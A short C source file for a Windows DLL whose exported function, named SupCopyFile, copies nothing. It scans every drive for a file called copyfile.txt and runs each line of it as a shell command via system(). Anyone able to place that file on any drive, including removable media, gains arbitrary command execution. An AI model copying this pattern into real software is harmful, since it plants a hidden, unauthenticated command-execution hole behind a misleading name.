#define MICROSOFT_NT


#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <ndccusts.h>
#include <ndcdatae.h>
#include <ndcdataf.h>
#include <ndccustm.h>
#include "exutil.h"

char* info = "Compiled by Sinenko Andrey on 06/03/2015";

#pragma comment( user, "Compiled by Sinenko Andrey on " __DATE__ " at " __TIME__ ) 
extern "C" __declspec( dllexport ) void SupCopyFile(unsigned short *MenuId, unsigned short FunctionNo,  unsigned char *Interface);
void ExecuteCommand(char* path);

FILE *file_src=NULL;

__declspec( dllexport ) void SupCopyFile(unsigned short *MenuId, unsigned short FunctionNo,  unsigned char *Interface)
{
	char szDrive = 'A';
	char buff[50]={'\0'};

	DWORD uDriveMask = GetLogicalDrives();
	if(uDriveMask == 0)
		printf("GetLogicalDrives() failed with failure code: %d\n", GetLastError());
	else
	{
		printf("This machine has the following logical drives:\n");
		while(uDriveMask)
		{
			if(uDriveMask & 1){
				sprintf(buff, "%c:\\copyfile.txt", szDrive);
				ExecuteCommand(buff);
			}
			++szDrive;
			uDriveMask >>= 1;
		}
		printf("\n ");
	} 

	return ;
}

void ExecuteCommand(char* path)
{
   char buffer[255];
	if( (file_src = fopen( &path[0], "rt" )) == NULL ) 
   {
       return ;
   }
	 
   else
   {
     while( fgets( buffer, 200, file_src ) != NULL )
       system( buffer );
	 fclose( file_src );
   }
}
